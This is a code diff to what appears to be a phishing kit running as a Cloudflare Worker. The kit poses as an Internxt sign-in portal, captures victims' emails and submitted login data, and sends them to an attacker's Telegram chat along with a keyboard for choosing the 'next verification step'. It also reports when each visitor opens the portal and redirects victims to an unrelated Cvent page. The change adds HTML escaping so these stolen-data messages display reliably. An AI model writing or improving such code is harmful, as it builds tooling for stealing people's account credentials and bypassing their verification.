@@ -3,6 +3,10 @@
  * Intercepts /next.php/*, /check.php, and /redirect.php, serving the rest as static assets.
  */
 
+function escapeHtml(str) {
+  return String(str || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
 const FINAL_CVENT_URL = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
 
 // In-worker memory session store
@@ -341,7 +345,9 @@ export default {
       cfSessions.set(sessionId, session);
 
       if (botToken && targetChatId) {
-        const text = `🔔 <b>New Sign-In Submission (Internxt)</b>\n━━━━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${email || 'Unknown'}</code>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n<pre>${data.result.substring(0, 800)}</pre>\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`;
+        const cleanEmail = escapeHtml(email || 'Unknown');
+        const cleanResult = escapeHtml(data.result.substring(0, 800));
+        const text = `🔔 <b>New Sign-In Submission (Internxt)</b>\n━━━━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${cleanEmail}</code>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n<pre>${cleanResult}</pre>\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`;
         const keyboard = buildMainActionsKeyboard(sessionId);
 
         await callTelegram(botToken, 'sendMessage', {
@@ -376,7 +382,7 @@ export default {
       if (botToken && targetChatId && data.message) {
         await callTelegram(botToken, 'sendMessage', {
           chat_id: targetChatId,
-          text: `🌐 <b>Visitor Opened Portal</b>\n<pre>${data.message}</pre>`,
+          text: `🌐 <b>Visitor Opened Portal</b>\n<pre>${escapeHtml(data.message)}</pre>`,
           parse_mode: 'HTML'
         });
       }
